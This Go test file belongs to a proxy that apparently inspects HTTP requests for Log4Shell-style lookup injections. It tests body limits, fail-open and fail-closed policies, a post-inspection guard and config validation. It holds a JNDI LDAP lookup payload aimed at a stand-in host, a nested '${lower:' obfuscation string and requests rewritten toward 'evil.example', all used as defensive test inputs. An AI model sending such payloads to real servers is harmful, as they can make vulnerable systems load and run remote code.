package proxy

import (
	"context"
	"crypto/tls"
	"errors"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/http/httputil"
	"net/url"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/TurlaFSB/logshield/internal/engine"
)

func TestOversizeBody(t *testing.T) {
	big := strings.Repeat("a", 5000)
	t.Run("block mode rejects", func(t *testing.T) {
		h := newHarness(t, func(c *Config) { c.Mode = ModeBlock; c.MaxBodyBytes = 1000 })
		r := h.do("POST", "/up", http.Header{"Content-Type": {"text/plain"}}, strings.NewReader(big))
		if r.Status != 413 || h.up.count() != 0 {
			t.Fatalf("status %d, upstream %d", r.Status, h.up.count())
		}
		if ev := h.lastEvent(); ev.Action != ActionRejected || ev.Reason != reasonBodyTooLarge {
			t.Errorf("event %+v", ev)
		}
	})
	t.Run("block mode rejects chunked of unknown length", func(t *testing.T) {
		h := newHarness(t, func(c *Config) { c.Mode = ModeBlock; c.MaxBodyBytes = 1000 })
		r := h.raw("POST / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n1388\r\n" + big + "\r\n0\r\n\r\n")
		if r.Status != 413 || h.up.count() != 0 {
			t.Fatalf("status %d, upstream %d", r.Status, h.up.count())
		}
	})
	t.Run("monitor mode forwards everything and inspects a prefix", func(t *testing.T) {
		h := newHarness(t, func(c *Config) { c.MaxBodyBytes = 1000 })
		body := attack + big
		r := h.do("POST", "/up", http.Header{"Content-Type": {"text/plain"}}, strings.NewReader(body))
		if r.Status != 200 {
			t.Fatalf("status %d", r.Status)
		}
		if got := h.up.received()[0]; string(got.Body) != body {
			t.Errorf("upstream body is %d bytes, want %d", len(got.Body), len(body))
		}
		ev := h.lastEvent()
		if !ev.BodyTruncated || ev.BodyBytes != 1000 || !ev.WouldBlock {
			t.Errorf("event %+v", ev)
		}
		if in := h.inspected(); len(in[0].Body) != 1000 {
			t.Errorf("engine saw %d body bytes", len(in[0].Body))
		}
	})
	t.Run("monitor mode, chunked", func(t *testing.T) {
		h := newHarness(t, func(c *Config) { c.MaxBodyBytes = 1000 })
		r := h.raw("POST / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n1388\r\n" + big + "\r\n0\r\n\r\n")
		if r.Status != 200 || len(h.up.received()[0].Body) != 5000 {
			t.Errorf("status %d, upstream body %d", r.Status, len(h.up.received()[0].Body))
		}
	})
	t.Run("exactly the limit is inspected whole", func(t *testing.T) {
		h := newHarness(t, func(c *Config) { c.Mode = ModeBlock; c.MaxBodyBytes = 1000 })
		r := h.do("POST", "/up", http.Header{"Content-Type": {"text/plain"}}, strings.NewReader(strings.Repeat("b", 1000)))
		if r.Status != 200 || h.lastEvent().BodyTruncated {
			t.Errorf("status %d event %+v", r.Status, h.lastEvent())
		}
	})
}

func TestSkippedBodyTypesAreStreamed(t *testing.T) {
	h := newHarness(t, func(c *Config) {
		c.Mode = ModeBlock
		c.MaxBodyBytes = 1000
		c.SkipBodyTypes = []string{"image/", "application/octet-stream"}
	})
	blob := strings.Repeat("\x89PNG", 5000) + attack
	for _, ct := range []string{"image/png", "application/octet-stream; charset=binary"} {
		r := h.do("POST", "/up", http.Header{"Content-Type": {ct}}, strings.NewReader(blob))
		if r.Status != 200 {
			t.Fatalf("%s: status %d", ct, r.Status)
		}
		if got := h.up.received(); string(got[len(got)-1].Body) != blob {
			t.Errorf("%s: upstream body differs", ct)
		}
		if ev := h.lastEvent(); !ev.BodySkipped || ev.BodyBytes != 0 {
			t.Errorf("%s: event %+v", ct, ev)
		}
	}
	// A text body of the same size is not skipped, and is too large.
	if r := h.do("POST", "/up", http.Header{"Content-Type": {"text/plain"}}, strings.NewReader(blob)); r.Status != 413 {
		t.Errorf("text body: status %d", r.Status)
	}
	// Headers and the target are still inspected for skipped bodies.
	if r := h.raw("POST /up HTTP/1.1\r\nHost: a\r\nContent-Type: image/png\r\nContent-Length: 3\r\nX-A: " + attack + "\r\nConnection: close\r\n\r\nabc"); r.Status != 403 {
		t.Errorf("attack header with skipped body: status %d", r.Status)
	}
}

func TestInspectionFailurePolicy(t *testing.T) {
	tests := []struct {
		mode       Mode
		onError    FailPolicy
		wantStatus int
		wantUp     int
		failedOpen bool
	}{
		{ModeBlock, FailClosed, 503, 0, false},
		{ModeBlock, FailOpen, 200, 1, true},
		{ModeMonitor, FailClosed, 200, 1, false}, // monitor never blocks
		{ModeMonitor, FailOpen, 200, 1, false},
	}
	for _, tc := range tests {
		t.Run(string(tc.mode)+"/"+string(tc.onError), func(t *testing.T) {
			h := newHarness(t, func(c *Config) { c.Mode, c.OnError = tc.mode, tc.onError })
			h.proxy.inspect = func(engine.Request, engine.Config) engine.Verdict { panic("boom ${jndi:ldap://x.invalid/a}") }
			r := h.raw(rawGET("/"))
			ev := h.lastEvent()
			if r.Status != tc.wantStatus || h.up.count() != tc.wantUp || ev.FailedOpen != tc.failedOpen || ev.Reason != reasonInspection {
				t.Errorf("status %d upstream %d event %+v", r.Status, h.up.count(), ev)
			}
			if strings.Contains(h.logs.String(), "${") {
				t.Errorf("panic text put an active lookup in the log:\n%s", h.logs.String())
			}
		})
	}
}

func TestBudgetExhaustionIsABlockNotAnError(t *testing.T) {
	h := newHarness(t, func(c *Config) { c.Mode = ModeBlock; c.OnError = FailOpen })
	nested := strings.Repeat("${lower:", 40) + "x" + strings.Repeat("}", 40)
	r := h.raw(rawGET("/", "X-Nested: "+nested))
	if r.Status != 403 || h.up.count() != 0 {
		t.Fatalf("budget exhaustion with fail-open: status %d, upstream %d", r.Status, h.up.count())
	}
	if ev := h.lastEvent(); ev.Exhausted == engine.BudgetNone || ev.FailedOpen {
		t.Errorf("event %+v", ev)
	}
}

func TestUpstreamFailures(t *testing.T) {
	t.Run("unreachable", func(t *testing.T) {
		h := newHarness(t, nil)
		h.up.Close()
		r := h.raw(rawGET("/"))
		ev := h.lastEvent()
		if r.Status != 502 || ev.Action != ActionError || ev.Reason != reasonUpstream {
			t.Errorf("status %d event %+v", r.Status, ev)
		}
		if strings.Contains(r.Body, "127.0.0.1") {
			t.Errorf("error response leaks the upstream address: %q", r.Body)
		}
	})
	t.Run("timeout", func(t *testing.T) {
		release := make(chan struct{})
		h := newHarness(t, func(c *Config) {
			tr := DefaultTransport()
			tr.ResponseHeaderTimeout = 50 * time.Millisecond
			c.Transport = tr
		})
		h.up.handler = func(http.ResponseWriter, *http.Request) { <-release }
		t.Cleanup(func() { close(release) })
		r := h.raw(rawGET("/"))
		if ev := h.lastEvent(); r.Status != 504 || ev.Reason != reasonUpstreamSlow {
			t.Errorf("status %d event %+v", r.Status, ev)
		}
	})
	t.Run("client goes away", func(t *testing.T) {
		started := make(chan struct{})
		h := newHarness(t, nil)
		h.up.handler = func(_ http.ResponseWriter, r *http.Request) {
			close(started)
			<-r.Context().Done()
		}
		conn := dial(t, h.addr())
		_, _ = io.WriteString(conn, rawGET("/"))
		<-started
		_ = conn.Close()
		deadline := time.Now().Add(3 * time.Second)
		for h.eventCount() == 0 && time.Now().Before(deadline) {
			time.Sleep(10 * time.Millisecond)
		}
		if h.eventCount() == 0 {
			t.Fatal("no event after client disconnect")
		}
		if ev := h.lastEvent(); ev.Action != ActionError || ev.Reason != reasonClientGone {
			t.Errorf("event %+v", ev)
		}
	})
}

func TestStreamingResponsesAreFlushed(t *testing.T) {
	h := newHarness(t, nil)
	step := make(chan struct{})
	h.up.handler = func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "text/event-stream")
		_, _ = io.WriteString(w, "data: one\n\n")
		w.(http.Flusher).Flush()
		<-step
		_, _ = io.WriteString(w, "data: two\n\n")
	}
	req, _ := http.NewRequestWithContext(context.Background(), http.MethodGet, h.server.URL+"/events", nil)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = resp.Body.Close() }()
	buf := make([]byte, 11)
	if _, err := io.ReadFull(resp.Body, buf); err != nil || string(buf) != "data: one\n\n" {
		t.Fatalf("first event not delivered before the stream ends: %q %v", buf, err)
	}
	close(step)
}

// The guard stops anything that differs from what was inspected, even if a bug
// elsewhere in the proxy introduced the difference.
func TestGuardStopsUninspectedChanges(t *testing.T) {
	mutations := map[string]func(*http.Request){
		"new header":     func(r *http.Request) { r.Header.Set("X-Added", "value") },
		"changed header": func(r *http.Request) { r.Header.Set("Accept", "text/evil") },
		"other target":   func(r *http.Request) { r.URL.Opaque = "/other" },
		"other host":     func(r *http.Request) { r.Host = "evil.example" },
		"other upstream": func(r *http.Request) { r.URL.Host = "evil.example:80" },
		"other method":   func(r *http.Request) { r.Method = "DELETE" },
		"transfer-enc":   func(r *http.Request) { r.TransferEncoding = []string{"chunked"} },
		"extra body":     func(r *http.Request) { r.Body = io.NopCloser(strings.NewReader("injected")); r.ContentLength = 8 },
	}
	for name, mutate := range mutations {
		t.Run(name, func(t *testing.T) {
			h := newHarness(t, nil)
			orig := h.proxy.rp.Rewrite
			h.proxy.rp.Rewrite = func(pr *httputil.ProxyRequest) { orig(pr); mutate(pr.Out) }
			r := h.raw(rawGET("/path?x=1", "Accept: */*"))
			if r.Status != 502 || h.up.count() != 0 {
				t.Fatalf("status %d, upstream saw %d", r.Status, h.up.count())
			}
			if ev := h.lastEvent(); ev.Action != ActionError || ev.Reason != reasonGuard {
				t.Errorf("event %+v", ev)
			}
		})
	}
}

func TestGuardRequiresAPlan(t *testing.T) {
	g := guardTransport{next: http.DefaultTransport}
	req := httptest.NewRequestWithContext(context.Background(), "GET", "http://example.com/", nil)
	resp, err := g.RoundTrip(req)
	if resp != nil {
		_ = resp.Body.Close()
	}
	if !errors.Is(err, errGuard) {
		t.Errorf("err = %v", err)
	}
}

func TestObserverPanicDoesNotBreakTheRequest(t *testing.T) {
	h := newHarness(t, func(c *Config) { c.Observer = ObserverFunc(func(Event) { panic("observer bug") }) })
	if r := h.raw(rawGET("/")); r.Status != 200 {
		t.Errorf("status %d", r.Status)
	}
}

func TestConcurrentRequests(t *testing.T) {
	h := newHarness(t, func(c *Config) { c.Mode = ModeBlock })
	var wg sync.WaitGroup
	errs := make(chan string, 200)
	for i := 0; i < 40; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			for j := 0; j < 5; j++ {
				if i%2 == 0 {
					if r := h.do("GET", "/ok?i="+strings.Repeat("x", i), nil, nil); r.Status != 200 {
						errs <- "clean request got " + http.StatusText(r.Status)
					}
				} else if r := h.do("GET", "/", http.Header{"User-Agent": {attack}}, nil); r.Status != 403 {
					errs <- "attack got " + http.StatusText(r.Status)
				}
			}
		}(i)
	}
	wg.Wait()
	close(errs)
	for e := range errs {
		t.Error(e)
	}
	if h.up.count() != 100 {
		t.Errorf("upstream saw %d requests, want 100", h.up.count())
	}
}

func TestConfigValidate(t *testing.T) {
	good := func() Config { return Config{Upstream: mustURL("http://127.0.0.1:8080")} }
	if err := good().Validate(); err != nil {
		t.Fatalf("good config: %v", err)
	}
	bad := map[string]func(*Config){
		"upstream is required":         func(c *Config) { c.Upstream = nil },
		"scheme must be http":          func(c *Config) { c.Upstream = mustURL("ftp://x") },
		"needs a host":                 func(c *Config) { c.Upstream = mustURL("http://") },
		"credentials":                  func(c *Config) { c.Upstream = mustURL("http://u:p@x") },
		"verbatim":                     func(c *Config) { c.Upstream = mustURL("http://x/base") },
		"unknown mode":                 func(c *Config) { c.Mode = "audit" },
		"unknown on-error":             func(c *Config) { c.OnError = "maybe" },
		"unknown forwarded-for":        func(c *Config) { c.ForwardedFor = "x" },
		"negative":                     func(c *Config) { c.MaxBodyBytes = -1 },
		"block status":                 func(c *Config) { c.BlockStatus = 200 },
		"skip body type":               func(c *Config) { c.SkipBodyTypes = []string{"Image/PNG"} },
		"engine:":                      func(c *Config) { c.Engine.Disabled = []engine.RuleID{"LSH-9"} },
		"exceeds the engine's request": func(c *Config) { c.MaxBodyBytes = 8 << 20 },
	}
	for want, mutate := range bad {
		c := good()
		mutate(&c)
		err := c.Validate()
		if err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("%q: err = %v", want, err)
		}
		if _, nerr := New(c); nerr == nil {
			t.Errorf("%q: New accepted it", want)
		}
	}
	d := Config{Upstream: mustURL("http://x")}.withDefaults()
	if d.Mode != ModeMonitor || d.OnError != FailClosed || d.ForwardedFor != ForwardedForReplace || d.MaxBodyBytes != 1<<20 || d.BlockStatus != 403 {
		t.Errorf("defaults: %+v", d)
	}
}

func mustURL(s string) *url.URL {
	u, err := url.Parse(s)
	if err != nil {
		panic(err)
	}
	return u
}

func TestNewServerSetsLimits(t *testing.T) {
	s := NewServer(":0", http.NotFoundHandler(), ServerConfig{}, nil)
	if s.ReadHeaderTimeout == 0 || s.ReadTimeout == 0 || s.IdleTimeout == 0 || s.MaxHeaderBytes != 64<<10 || s.ErrorLog == nil {
		t.Errorf("limits not set: %+v", s)
	}
	c := NewServer(":0", http.NotFoundHandler(), ServerConfig{ReadHeaderTimeout: time.Second, ReadTimeout: 2 * time.Second, WriteTimeout: 3 * time.Second, IdleTimeout: 4 * time.Second, MaxHeaderBytes: 1000}, nil)
	if c.ReadHeaderTimeout != time.Second || c.WriteTimeout != 3*time.Second || c.MaxHeaderBytes != 1000 {
		t.Errorf("custom limits ignored: %+v", c)
	}
}

func TestDefaultTransportIsHardened(t *testing.T) {
	tr := DefaultTransport()
	if tr.Proxy != nil || !tr.DisableCompression || tr.ResponseHeaderTimeout == 0 || tr.TLSHandshakeTimeout == 0 {
		t.Errorf("transport: %+v", tr)
	}
}

func TestPlanVerifyBodyRules(t *testing.T) {
	up := mustURL("http://up.example:80")
	mk := func(kind bodyKind, data string) (*plan, *http.Request) {
		snap := snapshot{method: "POST", target: "/x", host: "a", body: []byte(data)}
		pl := &plan{snap: snap, allowed: snap.allowed(), upstream: up, host: "a", kind: kind, bodyLen: len(data)}
		pl.body = &bufferedBody{r: strings.NewReader(data)}
		req := httptest.NewRequestWithContext(context.Background(), "POST", "http://up.example:80", nil)
		req.URL.Opaque, req.Host = "/x", "a"
		req.Header = http.Header{}
		return pl, req
	}
	t.Run("empty buffered body must be absent", func(t *testing.T) {
		pl, req := mk(bodyBuffered, "")
		req.Body = io.NopCloser(strings.NewReader("x"))
		if err := pl.verify(req); !errors.Is(err, errGuard) {
			t.Errorf("err = %v", err)
		}
		req.Body = nil
		if err := pl.verify(req); err != nil {
			t.Errorf("err = %v", err)
		}
	})
	t.Run("buffered body must be the inspected buffer", func(t *testing.T) {
		pl, req := mk(bodyBuffered, "abc")
		req.Body, req.ContentLength = pl.body, 3
		if err := pl.verify(req); err != nil {
			t.Errorf("err = %v", err)
		}
		req.ContentLength = 4
		if err := pl.verify(req); !errors.Is(err, errGuard) {
			t.Errorf("wrong length accepted: %v", err)
		}
	})
	t.Run("streamed body", func(t *testing.T) {
		pl, req := mk(bodyStreamed, "")
		req.Body = &streamedBody{Reader: strings.NewReader("x"), Closer: io.NopCloser(nil)}
		if err := pl.verify(req); err != nil {
			t.Errorf("err = %v", err)
		}
		req.Body = io.NopCloser(strings.NewReader("x"))
		if err := pl.verify(req); !errors.Is(err, errGuard) {
			t.Errorf("foreign stream accepted: %v", err)
		}
		req.Body = nil
		if err := pl.verify(req); err != nil {
			t.Errorf("empty stream: %v", err)
		}
	})
	t.Run("content-length header must match", func(t *testing.T) {
		pl, req := mk(bodyBuffered, "abc")
		req.Body, req.ContentLength = pl.body, 3
		req.Header.Set("Content-Length", "3")
		if err := pl.verify(req); err != nil {
			t.Errorf("err = %v", err)
		}
		req.Header.Set("Content-Length", "999")
		if err := pl.verify(req); !errors.Is(err, errGuard) {
			t.Errorf("wrong Content-Length header accepted: %v", err)
		}
	})
}

func TestRemoteIPAndForwardedProto(t *testing.T) {
	r := httptest.NewRequestWithContext(context.Background(), "GET", "/", nil)
	r.RemoteAddr = "203.0.113.5"
	if got := remoteIP(r); got != "203.0.113.5" {
		t.Errorf("remoteIP = %q", got)
	}
	r.RemoteAddr = "[2001:db8::1]:4444"
	if got := remoteIP(r); got != "2001:db8::1" {
		t.Errorf("remoteIP = %q", got)
	}
	out := httptest.NewRequestWithContext(context.Background(), "GET", "/", nil)
	r.TLS = &tls.ConnectionState{}
	setForwarded(r, out, false, false)
	if out.Header.Get("X-Forwarded-Proto") != "https" || out.Header.Get("X-Forwarded-For") != "2001:db8::1" {
		t.Errorf("headers: %v", out.Header)
	}
}

func TestStatusRecorder(t *testing.T) {
	rec := &statusRecorder{ResponseWriter: httptest.NewRecorder()}
	if _, err := rec.Write([]byte("x")); err != nil || rec.status != 200 {
		t.Errorf("implicit status = %d (%v)", rec.status, err)
	}
	rec.WriteHeader(http.StatusInternalServerError) // too late: the first status wins
	if rec.status != 200 {
		t.Errorf("status changed to %d", rec.status)
	}
	if rec.Unwrap() == nil {
		t.Error("Unwrap returned nil")
	}
}

func TestNewUsesSafeDefaults(t *testing.T) {
	p, err := New(Config{Upstream: mustURL("http://127.0.0.1:1")})
	if err != nil {
		t.Fatal(err)
	}
	if p.log == nil || p.rp.Transport == nil || p.cfg.Mode != ModeMonitor {
		t.Errorf("defaults not applied: %+v", p.cfg)
	}
	a, b := newID(), newID()
	if len(a) != 16 || a == b {
		t.Error("request IDs must be 16 hex characters and unique")
	}
}

func TestClientAbortsBody(t *testing.T) {
	h := newHarness(t, nil)
	conn := dial(t, h.addr())
	_, _ = io.WriteString(conn, "POST / HTTP/1.1\r\nHost: a\r\nContent-Length: 100\r\n\r\nshort")
	_ = conn.(*net.TCPConn).CloseWrite()
	buf := make([]byte, 512)
	n, _ := conn.Read(buf)
	_ = conn.Close()
	if !strings.Contains(string(buf[:n]), "400") || h.up.count() != 0 {
		t.Errorf("response %q, upstream %d", buf[:n], h.up.count())
	}
}
